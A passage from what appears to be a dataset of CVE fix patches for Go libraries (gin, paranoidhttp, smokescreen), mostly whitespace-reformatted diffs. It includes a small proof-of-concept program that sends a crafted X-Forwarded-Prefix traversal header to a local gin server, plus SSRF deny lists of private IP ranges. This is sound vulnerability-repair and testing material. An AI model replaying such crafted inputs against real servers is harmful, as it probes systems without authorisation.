engine.pool.Get().(*Context)\n-\tc.writermem.reset(w)\n-\tc.Request = req\n-\tc.reset()\n+        c := engine.pool.Get().(*Context)\n+        c.writermem.reset(w)\n+        c.Request = req\n+        c.reset()\n \n-\tengine.handleHTTPRequest(c)\n+        engine.handleHTTPRequest(c)\n \n-\tengine.pool.Put(c)\n+        engine.pool.Put(c)\n }\n \n // HandleContext re-enters a context that has been rewritten.\n // This can be done by setting c.Request.URL.Path to your new target.\n // Disclaimer: You can loop yourself to deal with this, use wisely.\n func (engine *Engine) HandleContext(c *Context) {\n-\toldIndexValue := c.index\n-\tc.reset()\n-\tengine.handleHTTPRequest(c)\n+        oldIndexValue := c.index\n+        c.reset()\n+        engine.handleHTTPRequest(c)\n \n-\tc.index = oldIndexValue\n+        c.index = oldIndexValue\n }\n \n func (engine *Engine) handleHTTPRequest(c *Context) {\n-\thttpMethod := c.Request.Method\n-\trPath := c.Request.URL.Path\n-\tunescape := false\n-\tif engine.UseRawPath && len(c.Request.URL.RawPath) > 0 {\n-\t\trPath = c.Request.URL.RawPath\n-\t\tunescape = engine.UnescapePathValues\n-\t}\n-\n-\tif engine.RemoveExtraSlash {\n-\t\trPath = cleanPath(rPath)\n-\t}\n-\n-\t// Find root of the tree for the given HTTP method\n-\tt := engine.trees\n-\tfor i, tl := 0, len(t); i < tl; i++ {\n-\t\tif t[i].method != httpMethod {\n-\t\t\tcontinue\n-\t\t}\n-\t\troot := t[i].root\n-\t\t// Find route in tree\n-\t\tvalue := root.getValue(rPath, c.params, c.skippedNodes, unescape)\n-\t\tif value.params != nil {\n-\t\t\tc.Params = *value.params\n-\t\t}\n-\t\tif value.handlers != nil {\n-\t\t\tc.handlers = value.handlers\n-\t\t\tc.fullPath = value.fullPath\n-\t\t\tc.Next()\n-\t\t\tc.writermem.WriteHeaderNow()\n-\t\t\treturn\n-\t\t}\n-\t\tif httpMethod != http.MethodConnect && rPath != \"/\" {\n-\t\t\tif value.tsr && engine.RedirectTrailingSlash {\n-\t\t\t\tredirectTrailingSlash(c)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tif engine.RedirectFixedPath && redirectFixedPath(c, root, engine.RedirectFixedPath) {\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t}\n-\t\tbreak\n-\t}\n-\n-\tif engine.HandleMethodNotAllowed {\n-\t\tfor _, tree := range engine.trees {\n-\t\t\tif tree.method == httpMethod {\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t\tif value := tree.root.getValue(rPath, nil, c.skippedNodes, unescape); value.handlers != nil {\n-\t\t\t\tc.handlers = engine.allNoMethod\n-\t\t\t\tserveError(c, http.StatusMethodNotAllowed, default405Body)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t}\n-\t}\n-\tc.handlers = engine.allNoRoute\n-\tserveError(c, http.StatusNotFound, default404Body)\n+        httpMethod := c.Request.Method\n+        rPath := c.Request.URL.Path\n+        unescape := false\n+        if engine.UseRawPath && len(c.Request.URL.RawPath) > 0 {\n+                rPath = c.Request.URL.RawPath\n+                unescape = engine.UnescapePathValues\n+        }\n+\n+        if engine.RemoveExtraSlash {\n+                rPath = cleanPath(rPath)\n+        }\n+\n+        // Find root of the tree for the given HTTP method\n+        t := engine.trees\n+        for i, tl := 0, len(t); i < tl; i++ {\n+                if t[i].method != httpMethod {\n+                        continue\n+                }\n+                root := t[i].root\n+                // Find route in tree\n+                value := root.getValue(rPath, c.params, c.skippedNodes, unescape)\n+                if value.params != nil {\n+                        c.Params = *value.params\n+                }\n+                if value.handlers != nil {\n+                        c.handlers = value.handlers\n+                        c.fullPath = value.fullPath\n+                        c.Next()\n+                        c.writermem.WriteHeaderNow()\n+                        return\n+                }\n+                if httpMethod != http.MethodConnect && rPath != \"/\" {\n+                        if value.tsr && engine.RedirectTrailingSlash {\n+                                redirectTrailingSlash(c)\n+                                return\n+                        }\n+                        if engine.RedirectFixedPath && redirectFixedPath(c, root, engine.RedirectFixedPath) {\n+                                return\n+                        }\n+                }\n+                break\n+        }\n+\n+        if engine.HandleMethodNotAllowed {\n+                for _, tree := range engine.trees {\n+                        if tree.method == httpMethod {\n+                                continue\n+                        }\n+                        if value := tree.root.getValue(rPath, nil, c.skippedNodes, unescape); value.handlers != nil {\n+                                c.handlers = engine.allNoMethod\n+                                serveError(c, http.StatusMethodNotAllowed, default405Body)\n+                                return\n+                        }\n+                }\n+        }\n+        c.handlers = engine.allNoRoute\n+        serveError(c, http.StatusNotFound, default404Body)\n }\n \n var mimePlain = []string{MIMEPlain}\n \n func serveError(c *Context, code int, defaultMessage []byte) {\n-\tc.writermem.status = code\n-\tc.Next()\n-\tif c.writermem.Written() {\n-\t\treturn\n-\t}\n-\tif c.writermem.Status() == code {\n-\t\tc.writermem.Header()[\"Content-Type\"] = mimePlain\n-\t\t_, err := c.Writer.Write(defaultMessage)\n-\t\tif err != nil {\n-\t\t\tdebugPrint(\"cannot write message to writer during serve error: %v\", err)\n-\t\t}\n-\t\treturn\n-\t}\n-\tc.writermem.WriteHeaderNow()\n+        c.writermem.status = code\n+        c.Next()\n+        if c.writermem.Written() {\n+                return\n+        }\n+        if c.writermem.Status() == code {\n+                c.writermem.Header()[\"Content-Type\"] = mimePlain\n+                _, err := c.Writer.Write(defaultMessage)\n+                if err != nil {\n+                        debugPrint(\"cannot write message to writer during serve error: %v\", err)\n+                }\n+                return\n+        }\n+        c.writermem.WriteHeaderNow()\n }\n \n func redirectTrailingSlash(c *Context) {\n-\treq := c.Request\n-\tp := req.URL.Path\n-\tif prefix := path.Clean(c.Request.Header.Get(\"X-Forwarded-Prefix\")); prefix != \".\" {\n-\t\tprefix = url.QueryEscape(prefix)\n-\t\tprefix = strings.ReplaceAll(prefix, \"%2F\", \"/\")\n+        req := c.Request\n+        p := req.URL.Path\n+        if prefix := c.Request.Header.Get(\"X-Forwarded-Prefix\"); prefix != \".\" {\n+                prefix = url.QueryEscape(prefix)\n+                prefix = strings.ReplaceAll(prefix, \"%2F\", \"/\")\n \n-\t\tp = prefix + \"/\" + req.URL.Path\n-\t}\n-\treq.URL.Path = p + \"/\"\n-\tif length := len(p); length > 1 && p[length-1] == '/' {\n-\t\treq.URL.Path = p[:length-1]\n-\t}\n-\tredirectRequest(c)\n+                p = path.Join(prefix, p)\n+        }\n+        req.URL.Path = p + \"/\"\n+        if length := len(p); length > 1 && p[length-1] == '/' {\n+                req.URL.Path = p[:length-1]\n+        }\n+        redirectRequest(c)\n }\n \n func redirectFixedPath(c *Context, root *node, trailingSlash bool) bool {\n-\treq := c.Request\n-\trPath := req.URL.Path\n+        req := c.Request\n+        rPath := req.URL.Path\n \n-\tif fixedPath, ok := root.findCaseInsensitivePath(cleanPath(rPath), trailingSlash); ok {\n-\t\treq.URL.Path = bytesconv.BytesToString(fixedPath)\n-\t\tredirectRequest(c)\n-\t\treturn true\n-\t}\n-\treturn false\n+        if fixedPath, ok := root.findCaseInsensitivePath(cleanPath(rPath), trailingSlash); ok {\n+                req.URL.Path = bytesconv.BytesToString(fixedPath)\n+                redirectRequest(c)\n+                return true\n+        }\n+        return false\n }\n \n func redirectRequest(c *Context) {\n-\treq := c.Request\n-\trPath := req.URL.Path\n-\trURL := req.URL.String()\n-\n-\tcode := http.StatusMovedPermanently // Permanent redirect, request with GET method\n-\tif req.Method != http.MethodGet {\n-\t\tcode = http.StatusTemporaryRedirect\n-\t}\n-\tdebugPrint(\"redirecting request %d: %s --> %s\", code, rPath, rURL)\n-\thttp.Redirect(c.Writer, req, rURL, code)\n-\tc.writermem.WriteHeaderNow()\n+        req := c.Request\n+        rPath := req.URL.Path\n+        rURL := req.URL.String()\n+\n+        code := http.StatusMovedPermanently // Permanent redirect, request with GET method\n+        if req.Method != http.MethodGet {\n+                code = http.StatusTemporaryRedirect\n+        }\n+        debugPrint(\"redirecting request %d: %s --> %s\", code, rPath, rURL)\n+        http.Redirect(c.Writer, req, rURL, code)\n+        c.writermem.WriteHeaderNow()\n }\ndiff --git a/repro.go b/repro.go\nnew file mode 100644\nindex 0000000..4ccfe31\n--- /dev/null\n+++ b/repro.go\n@@ -0,0 +1,56 @@\n+\n+package main\n+\n+import (\n+    \"fmt\"\n+    \"io/ioutil\"\n+    \"log\"\n+    \"net/http\"\n+    \"time\"\n+\n+    \"github.com/gin-gonic/gin\"\n+)\n+\n+func main() {\n+    // Start a gin server in a goroutine\n+    go func() {\n+        gin.SetMode(gin.ReleaseMode)\n+        r := gin.New()\n+        r.RedirectTrailingSlash = true\n+        r.GET(\"/test/\", func(c *gin.Context) {\n+            c.String(200, \"Success\")\n+        })\n+        if err := r.Run(\":8081\"); err != nil {\n+            log.Printf(\"server error: %v\", err)\n+        }\n+    }()\n+    // Wait for the server to start\n+    time.Sleep(time.Second)\n+\n+    // Create a client that does not follow redirects\n+    client := &http.Client{\n+        CheckRedirect: func(req *http.Request, via []*http.Request) error {\n+            return http.ErrUseLastResponse\n+        },\n+    }\n+    // Create a request with the malicious header\n+    req, err := http.NewRequest(\"GET\", \"http://localhost:8081/test\", nil)\n+    if err != nil {\n+        log.Fatalf(\"failed to create request: %v\", err)\n+    }\n+    req.Header.Set(\"X-Forwarded-Prefix\", \"/a/../b\")\n+\n+    // Send the request\n+    resp, err := client.Do(req)\n+    if err != nil {\n+        log.Fatalf(\"failed to send request: %v\", err)\n+    }\n+    defer resp.Body.Close()\n+\n+    // Print the response\n+    fmt.Printf(\"Status Code: %d\\n\", resp.StatusCode)\n+    location, _ := resp.Location()\n+    fmt.Printf(\"Location: %s\\n\", location)\n+    body, _ := ioutil.ReadAll(resp.Body)\n+    fmt.Printf(\"Body: %s\\n\", string(body))\n+}\n"}
{"cve":"CVE-2023-24623:0708", "fix_patch": "diff --git a/client.go b/client.go\nindex 4f80444..09b3058 100644\n--- a/client.go\n+++ b/client.go\n@@ -1,87 +1,87 @@\n package paranoidhttp\n \n import (\n-\t\"context\"\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"net\"\n-\t\"net/http\"\n-\t\"regexp\"\n-\t\"time\"\n+        \"context\"\n+        \"errors\"\n+        \"fmt\"\n+        \"net\"\n+        \"net/http\"\n+        \"regexp\"\n+        \"time\"\n )\n \n // Config stores the rules for allowing IP/hosts\n type config struct {\n-\tForbiddenIPNets []*net.IPNet\n-\tPermittedIPNets []*net.IPNet\n-\tForbiddenHosts  []*regexp.Regexp\n+        ForbiddenIPNets []*net.IPNet\n+        PermittedIPNets []*net.IPNet\n+        ForbiddenHosts  []*regexp.Regexp\n }\n \n // DefaultClient is the default Client whose setting is the same as http.DefaultClient.\n var (\n-\tdefaultConfig config\n-\tDefaultClient *http.Client\n+        defaultConfig config\n+        DefaultClient *http.Client\n )\n \n func mustParseCIDR(addr string) *net.IPNet {\n-\t_, ipnet, err := net.ParseCIDR(addr)\n-\tif err != nil {\n-\t\tpanic(`net: ParseCIDR(\"` + addr + `\"): ` + err.Error())\n-\t}\n-\treturn ipnet\n+        _, ipnet, err := net.ParseCIDR(addr)\n+        if err != nil {\n+                panic(`net: ParseCIDR(\"` + addr + `\"): ` + err.Error())\n+        }\n+        return ipnet\n }\n \n func init() {\n-\tdefaultConfig = config{\n-\t\tForbiddenIPNets: []*net.IPNet{\n-\t\t\tmustParseCIDR(\"10.0.0.0/8\"),     // private class A\n-\t\t\tmustParseCIDR(\"172.16.0.0/12\"),  // private class B\n-\t\t\tmustParseCIDR(\"192.168.0.0/16\"), // private class C\n-\t\t\tmustParseCIDR(\"192.0.2.0/24\"),   // test net 1\n-\t\t\tmustParseCIDR(\"192.88.99.0/24\"), // 6to4 relay\n-\t\t},\n-\t\tForbiddenHosts: []*regexp.Regexp{\n-\t\t\tregexp.MustCompile(`(?i)^localhost$`),\n-\t\t\tregexp.MustCompile(`(?i)\\s+`),\n-\t\t},\n-\t}\n-\tDefaultClient, _, _ = NewClient()\n+        defaultConfig = config{\n+                ForbiddenIPNets: []*net.IPNet{\n+                        mustParseCIDR(\"10.0.0.0/8\"),     // private class A\n+                        mustParseCIDR(\"172.16.0.0/12\"),  // private class B\n+                        mustParseCIDR(\"192.168.0.0/16\"), // private class C\n+                        mustParseCIDR(\"192.0.2.0/24\"),   // test net 1\n+                        mustParseCIDR(\"192.88.99.0/24\"), // 6to4 relay\n+                },\n+                ForbiddenHosts: []*regexp.Regexp{\n+                        regexp.MustCompile(`(?i)^localhost$`),\n+                        regexp.MustCompile(`(?i)\\s+`),\n+                },\n+        }\n+        DefaultClient, _, _ = NewClient()\n }\n \n // isHostForbidden checks whether a hostname is forbidden by the Config\n func (c *config) isHostForbidden(host string) bool {\n-\tfor _, forbiddenHost := range c.ForbiddenHosts {\n-\t\tif forbiddenHost.MatchString(host) {\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\treturn false\n+        for _, forbiddenHost := range c.ForbiddenHosts {\n+                if forbiddenHost.MatchString(host) {\n+                        return true\n+                }\n+        }\n+        return false\n }\n \n // isIPForbidden checks whether an IP address is forbidden by the Config\n func (c *config) isIPForbidden(ip net.IP) bool {\n-\tfor _, permittedIPNet := range c.PermittedIPNets {\n-\t\tif permittedIPNet.Contains(ip) {\n-\t\t\treturn false\n-\t\t}\n-\t}\n-\n-\tif ip.Equal(net.IPv4bcast) || !ip.IsGlobalUnicast() {\n-\t\treturn true\n-\t}\n-\n-\tfor _, forbiddenIPNet := range c.ForbiddenIPNets {\n-\t\tif forbiddenIPNet.Contains(ip) {\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\treturn false\n+        for _, permittedIPNet := range c.PermittedIPNets {\n+                if permittedIPNet.Contains(ip) {\n+                        return false\n+                }\n+        }\n+\n+        if ip.Equal(net.IPv4bcast) || !ip.IsGlobalUnicast() {\n+                return true\n+        }\n+\n+        for _, forbiddenIPNet := range c.ForbiddenIPNets {\n+                if forbiddenIPNet.Contains(ip) {\n+                        return true\n+                }\n+        }\n+        return false\n }\n \n // BasicConfig contains the most common hosts and IPs to be blocked\n func basicConfig() *config {\n-\tc := defaultConfig // copy to return clone\n-\treturn &c\n+        c := defaultConfig // copy to return clone\n+        return &c\n }\n \n // Option type of paranoidhttp\n@@ -89,71 +89,71 @@ type Option func(*config)\n \n // ForbiddenIPNets sets forbidden IPNets\n func ForbiddenIPNets(ips ...*net.IPNet) Option {\n-\treturn func(c *config) {\n-\t\tc.ForbiddenIPNets = ips\n-\t}\n+        return func(c *config) {\n+                c.ForbiddenIPNets = ips\n+        }\n }\n \n // PermittedIPNets sets permitted IPNets\n // It takes priority over other forbidden rules.\n func PermittedIPNets(ips ...*net.IPNet) Option {\n-\treturn func(c *config) {\n-\t\tc.PermittedIPNets = ips\n-\t}\n+        return func(c *config) {\n+                c.PermittedIPNets = ips\n+        }\n }\n \n // ForbiddenHosts set forbidden host rules by regexp\n func ForbiddenHosts(hostRegs ...*regexp.Regexp) Option {\n-\treturn func(c *config) {\n-\t\tc.ForbiddenHosts = hostRegs\n-\t}\n+        return func(c *config) {\n+                c.ForbiddenHosts = hostRegs\n+        }\n }\n \n func safeAddr(ctx context.Context, resolver *net.Resolver, hostport string, opts ...Option) (string, error) {\n-\tc := basicConfig()\n-\tfor _, opt := range opts {\n-\t\topt(c)\n-\t}\n-\thost, port, err := net.SplitHostPort(hostport)\n-\tif err != nil {\n-\t\treturn \"\", err\n-\t}\n-\n-\tip := net.ParseIP(host)\n-\tif ip != nil {\n-\t\tif ip.To4() != nil && c.isIPForbidden(ip) {\n-\t\t\treturn \"\", fmt.Errorf(\"bad ip is detected: %v\", ip)\n-\t\t}\n-\t\treturn net.JoinHostPort(ip.String(), port), nil\n-\t}\n-\n-\tif c.isHostForbidden(host) {\n-\t\treturn \"\", fmt.Errorf(\"bad host is detected: %v\", host)\n-\t}\n-\n-\tr := resolver\n-\tif r == nil {\n-\t\tr = net.DefaultResolver\n-\t}\n-\taddrs, err := r.LookupIPAddr(ctx, host)\n-\tif err != nil || len(addrs) <= 0 {\n-\t\treturn \"\", err\n-\t}\n-\tsafeAddrs := make([]net.IPAddr, 0, len(addrs))\n-\tfor _, addr := range addrs {\n-\t\t// only support IPv4 address\n-\t\tif addr.IP.To4() == nil {\n-\t\t\tcontinue\n-\t\t}\n-\t\tif c.isIPForbidden(addr.IP) {\n-\t\t\treturn \"\", fmt.Errorf(\"bad ip is detected: %v\", addr.IP)\n-\t\t}\n-\t\tsafeAddrs = append(safeAddrs, addr)\n-\t}\n-\tif len(safeAddrs) == 0 {\n-\t\treturn \"\", fmt.Errorf(\"fail to lookup ip addr: %v\", host)\n-\t}\n-\treturn net.JoinHostPort(safeAddrs[0].IP.String(), port), nil\n+        c := basicConfig()\n+        for _, opt := range opts {\n+                opt(c)\n+        }\n+        host, port, err := net.SplitHostPort(hostport)\n+        if err != nil {\n+                return \"\", err\n+        }\n+\n+        ip := net.ParseIP(host)\n+        if ip != nil {\n+                if ip.IsUnspecified() || (ip.To4() != nil && c.isIPForbidden(ip)) {\n+                        return \"\", fmt.Errorf(\"bad ip is detected: %v\", ip)\n+                }\n+                return net.JoinHostPort(ip.String(), port), nil\n+        }\n+\n+        if c.isHostForbidden(host) {\n+                return \"\", fmt.Errorf(\"bad host is detected: %v\", host)\n+        }\n+\n+        r := resolver\n+        if r == nil {\n+                r = net.DefaultResolver\n+        }\n+        addrs, err := r.LookupIPAddr(ctx, host)\n+        if err != nil || len(addrs) <= 0 {\n+                return \"\", err\n+        }\n+        safeAddrs := make([]net.IPAddr, 0, len(addrs))\n+        for _, addr := range addrs {\n+                // only support IPv4 address\n+                if addr.IP.To4() == nil {\n+                        continue\n+                }\n+                if c.isIPForbidden(addr.IP) {\n+                        return \"\", fmt.Errorf(\"bad ip is detected: %v\", addr.IP)\n+                }\n+                safeAddrs = append(safeAddrs, addr)\n+        }\n+        if len(safeAddrs) == 0 {\n+                return \"\", fmt.Errorf(\"fail to lookup ip addr: %v\", host)\n+        }\n+        return net.JoinHostPort(safeAddrs[0].IP.String(), port), nil\n }\n \n // NewDialer returns a dialer function which only accepts IPv4 connections.\n@@ -161,35 +161,35 @@ func safeAddr(ctx context.Context, resolver *net.Resolver, hostport string, opts\n // This is used to create a new paranoid http.Client,\n // because I'm not sure about a paranoid behavior for IPv6 connections :(\n func NewDialer(dialer *net.Dialer, opts ...Option) func(ctx context.Context, network, addr string) (net.Conn, error) {\n-\treturn func(ctx context.Context, network, hostport string) (net.Conn, error) {\n-\t\tswitch network {\n-\t\tcase \"tcp\", \"tcp4\":\n-\t\t\taddr, err := safeAddr(ctx, dialer.Resolver, hostport, opts...)\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, err\n-\t\t\t}\n-\t\t\treturn dialer.DialContext(ctx, \"tcp4\", addr)\n-\t\tdefault:\n-\t\t\treturn nil, errors.New(\"does not support any networks except tcp4\")\n-\t\t}\n-\t}\n+        return func(ctx context.Context, network, hostport string) (net.Conn, error) {\n+                switch network {\n+                case \"tcp\", \"tcp4\":\n+                        addr, err := safeAddr(ctx, dialer.Resolver, hostport, opts...)\n+                        if err != nil {\n+                                return nil, err\n+                        }\n+                        return dialer.DialContext(ctx, \"tcp4\", addr)\n+                default:\n+                        return nil, errors.New(\"does not support any networks except tcp4\")\n+                }\n+        }\n }\n \n // NewClient returns a new http.Client configured to be paranoid for attackers.\n //\n // This also returns http.Tranport and net.Dialer so that you can customize those behavior.\n func NewClient(opts ...Option) (*http.Client, *http.Transport, *net.Dialer) {\n-\tdialer := &net.Dialer{\n-\t\tTimeout:   30 * time.Second,\n-\t\tKeepAlive: 30 * time.Second,\n-\t}\n-\ttransport := &http.Transport{\n-\t\tProxy:               http.ProxyFromEnvironment,\n-\t\tDialContext:         NewDialer(dialer, opts...),\n-\t\tTLSHandshakeTimeout: 10 * time.Second,\n-\t}\n-\treturn &http.Client{\n-\t\tTimeout:   30 * time.Second,\n-\t\tTransport: transport,\n-\t}, transport, dialer\n+        dialer := &net.Dialer{\n+                Timeout:   30 * time.Second,\n+                KeepAlive: 30 * time.Second,\n+        }\n+        transport := &http.Transport{\n+                Proxy:               http.ProxyFromEnvironment,\n+                DialContext:         NewDialer(dialer, opts...),\n+                TLSHandshakeTimeout: 10 * time.Second,\n+        }\n+        return &http.Client{\n+                Timeout:   30 * time.Second,\n+                Transport: transport,\n+        }, transport, dialer\n }\n"}
{"cve":"CVE-2022-24825:0708", "fix_patch": "diff --git a/pkg/smokescreen/acl/v1/acl.go b/pkg/smokescreen/acl/v1/acl.go\nindex bf913c0..f478eb5 100644\n--- a/pkg/smokescreen/acl/v1/acl.go\n+++ b/pkg/smokescreen/acl/v1/acl.go\n@@ -1,81 +1,81 @@\n package acl\n \n import (\n-\t\"fmt\"\n-\t\"strings\"\n+        \"fmt\"\n+        \"strings\"\n \n-\t\"github.com/sirupsen/logrus\"\n+        \"github.com/sirupsen/logrus\"\n )\n \n type Decider interface {\n-\tDecide(service, host string) (Decision, error)\n+        Decide(service, host string) (Decision, error)\n }\n \n type ACL struct {\n-\tRules            map[string]Rule\n-\tDefaultRule      *Rule\n-\tGlobalDenyList   []string\n-\tGlobalAllowList  []string\n-\tDisabledPolicies []EnforcementPolicy\n-\t*logrus.Logger\n+        Rules            map[string]Rule\n+        DefaultRule      *Rule\n+        GlobalDenyList   []string\n+        GlobalAllowList  []string\n+        DisabledPolicies []EnforcementPolicy\n+        *logrus.Logger\n }\n \n type Rule struct {\n-\tProject     string\n-\tPolicy      EnforcementPolicy\n-\tDomainGlobs []string\n+        Project     string\n+        Policy      EnforcementPolicy\n+        DomainGlobs []string\n }\n \n type Decision struct {\n-\tReason  string\n-\tDefault bool\n-\tResult  DecisionResult\n-\tProject string\n+        Reason  string\n+        Default bool\n+        Result  DecisionResult\n+        Project string\n }\n \n func New(logger *logrus.Logger, loader Loader, disabledActions []string) (*ACL, error) {\n-\tacl, err := loader.Load()\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\terr = acl.DisablePolicies(disabledActions)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\terr = acl.Validate()\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tacl.Logger = logger\n-\n-\tif acl.DefaultRule == nil {\n-\t\tacl.Warn(\"no default rule set. any services without a rule will be denied.\")\n-\t}\n-\treturn acl, nil\n+        acl, err := loader.Load()\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        err = acl.DisablePolicies(disabledActions)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        err = acl.Validate()\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        acl.Logger = logger\n+\n+        if acl.DefaultRule == nil {\n+                acl.Warn(\"no default rule set. any services without a rule will be denied.\")\n+        }\n+        return acl, nil\n }\n \n // Add associates a rule with the specified service after verifying the rule's\n // policy and domains are valid. Add returns an error if the service rule\n // already exists.\n func (acl *ACL) Add(svc string, r Rule) error {\n-\terr := acl.PolicyDisabled(svc, r.Policy)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\terr = acl.ValidateDomains(r.DomainGlobs)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\tif _, ok := acl.Rules[svc]; ok {\n-\t\treturn fmt.Errorf(\"rule already exists for service %v\", svc)\n-\t}\n-\tacl.Rules[svc] = r\n-\treturn nil\n+        err := acl.PolicyDisabled(svc, r.Policy)\n+        if err != nil {\n+                return err\n+        }\n+\n+        err = acl.ValidateDomains(r.DomainGlobs)\n+        if err != nil {\n+                return err\n+        }\n+\n+        if _, ok := acl.Rules[svc]; ok {\n+                return fmt.Errorf(\"rule already exists for service %v\", svc)\n+        }\n+        acl.Rules[svc] = r\n+        return nil\n }\n \n // Decide takes uses the rule configured for the given service to determine if\n@@ -84,90 +84,90 @@ func (acl *ACL) Add(svc string, r Rule) error {\n //   3. The host has been globally allowed\n //   4. There is a default rule for the ACL\n func (acl *ACL) Decide(service, host string) (Decision, error) {\n-\tvar d Decision\n-\n-\trule := acl.Rule(service)\n-\tif rule == nil {\n-\t\td.Result = Deny\n-\t\td.Reason = \"no rule matched\"\n-\t\treturn d, nil\n-\t}\n-\n-\td.Project = rule.Project\n-\td.Default = rule == acl.DefaultRule\n-\n-\t// if the host matches any of the rule's allowed domains, allow\n-\tfor _, dg := range rule.DomainGlobs {\n-\t\tif hostMatchesGlob(host, dg) {\n-\t\t\td.Result, d.Reason = Allow, \"host matched allowed domain in rule\"\n-\t\t\treturn d, nil\n-\t\t}\n-\t}\n-\n-\t// if the host matches any of the global deny list, deny\n-\tfor _, dg := range acl.GlobalDenyList {\n-\t\tif hostMatchesGlob(host, dg) {\n-\t\t\td.Result, d.Reason = Deny, \"host matched rule in global deny list\"\n-\t\t\treturn d, nil\n-\t\t}\n-\t}\n-\n-\t// if the host matches any of the global allow list, allow\n-\tfor _, dg := range acl.GlobalAllowList {\n-\t\tif hostMatchesGlob(host, dg) {\n-\t\t\td.Result, d.Reason = Allow, \"host matched rule in global allow list\"\n-\t\t\treturn d, nil\n-\t\t}\n-\t}\n-\n-\tvar err error\n-\tswitch rule.Policy {\n-\tcase Report:\n-\t\td.Result, d.Reason = AllowAndReport, \"rule has allow and report policy\"\n-\tcase Enforce:\n-\t\td.Result, d.Reason = Deny, \"rule has enforce policy\"\n-\tcase Open:\n-\t\td.Result, d.Reason = Allow, \"rule has open enforcement policy\"\n-\tdefault:\n-\t\td.Result, d.Reason = Deny, \"unexpected policy value\"\n-\t\terr = fmt.Errorf(\"unexpected policy value for (%s -> %s): %d\", service, host, rule.Policy)\n-\t}\n-\n-\tif d.Default {\n-\t\td.Reason = \"default rule policy used\"\n-\t}\n-\n-\treturn d, err\n+        var d Decision\n+\n+        rule := acl.Rule(service)\n+        if rule == nil {\n+                d.Result = Deny\n+                d.Reason = \"no rule matched\"\n+                return d, nil\n+        }\n+\n+        d.Project = rule.Project\n+        d.Default = rule == acl.DefaultRule\n+\n+        // if the host matches any of the rule's allowed domains, allow\n+        for _, dg := range rule.DomainGlobs {\n+                if hostMatchesGlob(host, dg) {\n+                        d.Result, d.Reason = Allow, \"host matched allowed domain in rule\"\n+                        return d, nil\n+                }\n+        }\n+\n+        // if the host matches any of the global deny list, deny\n+        for _, dg := range acl.GlobalDenyList {\n+                if hostMatchesGlob(host, dg) {\n+                        d.Result, d.Reason = Deny, \"host matched rule in global deny list\"\n+                        return d, nil\n+                }\n+        }\n+\n+        // if the host matches any of the global allow list, allow\n+        for _, dg := range acl.GlobalAllowList {\n+                if hostMatchesGlob(host, dg) {\n+                        d.Result, d.Reason = Allow, \"host matched rule in global allow list\"\n+                        return d, nil\n+                }\n+        }\n+\n+        var err error\n+        switch rule.Policy {\n+        case Report:\n+                d.Result, d.Reason = AllowAndReport, \"rule has allow and report policy\"\n+        case Enforce:\n+                d.Result, d.Reason = Deny, \"rule has enforce policy\"\n+        case Open:\n+                d.Result, d.Reason = Allow, \"rule has open enforcement policy\"\n+        default:\n+                d.Result, d.Reason = Deny, \"unexpected policy value\"\n+                err = fmt.Errorf(\"unexpected policy value for (%s -> %s): %d\", service, host, rule.Policy)\n+        }\n+\n+        if d.Default {\n+                d.Reason = \"default rule policy used\"\n+        }\n+\n+        return d, err\n }\n \n // DisablePolicies takes a slice of actions (open, report, enforce), maps them\n // to their corresponding EnforcementPolicy, and adds them to the global\n // disabledPolicy slice.\n func (acl *ACL) DisablePolicies(actions []string) error {\n-\tfor _, a := range actions {\n-\t\tp, err := PolicyFromAction(a)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\tacl.DisabledPolicies = append(acl.DisabledPolicies, p)\n-\t}\n-\treturn nil\n+        for _, a := range actions {\n+                p, err := PolicyFromAction(a)\n+                if err != nil {\n+                        return err\n+                }\n+                acl.DisabledPolicies = append(acl.DisabledPolicies, p)\n+        }\n+        return nil\n }\n \n // Validate checks that the ACL that every rule has a conformant domain glob\n // and is not utilizing a disabled enforcement policy.\n func (acl *ACL) Validate() error {\n-\tfor svc, r := range acl.Rules {\n-\t\terr := acl.ValidateDomains(r.DomainGlobs)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\terr = acl.PolicyDisabled(svc, r.Policy)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t}\n-\treturn nil\n+        for svc, r := range acl.Rules {\n+                err := acl.ValidateDomains(r.DomainGlobs)\n+                if err != nil {\n+                        return err\n+                }\n+                err = acl.PolicyDisabled(svc, r.Policy)\n+                if err != nil {\n+                        return err\n+                }\n+        }\n+        return nil\n }\n \n // ValidateDomains takes a slice of domains and verifies they conform to\n@@ -176,59 +176,64 @@ func (acl *ACL) Validate() error {\n // Domains can only contain a single wildcard prefix\n // Domains cannot be represented as a sole wildcard\n func (acl *ACL) ValidateDomains(domains []string) error {\n-\tfor _, d := range domains {\n-\t\tif d == \"\" {\n-\t\t\treturn fmt.Errorf(\"glob cannot be empty\")\n-\t\t}\n-\n-\t\tif !strings.HasPrefix(d, \"*.\") && strings.HasPrefix(d, \"*\") {\n-\t\t\treturn fmt.Errorf(\"%v: domain glob must represent a full prefix (sub)domain\", d)\n-\t\t}\n-\n-\t\tdomainToCheck := strings.TrimPrefix(d, \"*\")\n-\t\tif strings.Contains(domainToCheck, \"*\") {\n-\t\t\treturn fmt.Errorf(\"%v: domain globs are only supported as prefix\", d)\n-\t\t}\n-\t}\n-\treturn nil\n+        for _, d := range domains {\n+                if d == \"\" {\n+                        return fmt.Errorf(\"glob cannot be empty\")\n+                }\n+\n+                if !strings.HasPrefix(d, \"*.\") && strings.HasPrefix(d, \"*\") {\n+                        return fmt.Errorf(\"%v: domain glob must represent a full prefix (sub)domain\", d)\n+                }\n+\n+                domainToCheck := strings.TrimPrefix(d, \"*\")\n+                if 